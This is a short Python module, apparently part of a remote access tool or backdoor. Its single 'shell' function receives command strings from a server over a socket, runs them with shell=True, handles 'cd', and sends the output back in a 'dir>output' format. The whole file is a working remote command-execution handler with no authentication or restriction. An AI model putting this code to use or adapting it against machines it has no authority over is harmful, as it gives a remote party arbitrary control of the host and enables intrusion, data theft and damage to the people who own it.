import subprocess
import os


def shell(client):
    """
    Executes shell commands from the server.
    :param client: Client socket object
    """
    data = client.receive()
    output_str = ''
    if data[:2] == 'cd' and len(data) > 2:
        try:
            os.chdir(data[3:].strip())
        except Exception as e:
            output_str = '[!] Could not change directory: {}\n'.format(e)
        else:
            output_str = ''
    elif len(data) > 0:
        try:
            cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = output_bytes.decode('utf-8', errors='replace')
        except Exception as e:
            output_str = '[!] Command execution unsuccessful: {}\n'.format(e)
            
    client.send(os.getcwd() + '>' + output_str)  # Sends message in the format of: "dir>output"
